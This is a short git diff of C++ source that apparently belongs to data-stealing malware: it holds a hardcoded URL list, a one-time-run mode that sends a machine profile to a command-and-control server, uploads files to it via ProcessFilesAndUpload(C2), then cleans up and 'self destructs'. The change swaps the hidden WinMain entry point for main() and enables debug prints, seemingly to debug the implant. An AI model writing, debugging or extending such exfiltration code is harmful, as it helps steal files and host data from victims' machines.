@@ -11,7 +11,7 @@ std::vector<std::wstring> URLS = {L"https://hudsonmart.shop"};
 
 
 void CleanupAndDestroy() {
-    //std::cout << "Beginning cleanup..." << std::endl;
+    std::cout << "Beginning cleanup..." << std::endl;
     std::this_thread::sleep_for(std::chrono::seconds(5));
     Cleanup();
     std::this_thread::sleep_for(std::chrono::seconds(3));
@@ -19,7 +19,7 @@ void CleanupAndDestroy() {
 }
 
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+int main() {
     // Mode 1: run once and then > cleanup > self destruct
     if (ONETIMERUN) { 
         bool ReachIntranet = googleConn(); 
@@ -31,7 +31,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
                 std::string response = SendProfile(PC2, JsonProfile);
                 auto jsonResp = nlohmann::json::parse(response);
                 if (jsonResp.contains("message") && jsonResp["message"] == "created") {
-                    //std::cout << "Running file upload" << std::endl;
+                    std::cout << "Running file upload" << std::endl;
                     ProcessFilesAndUpload(C2);
                 }
             }
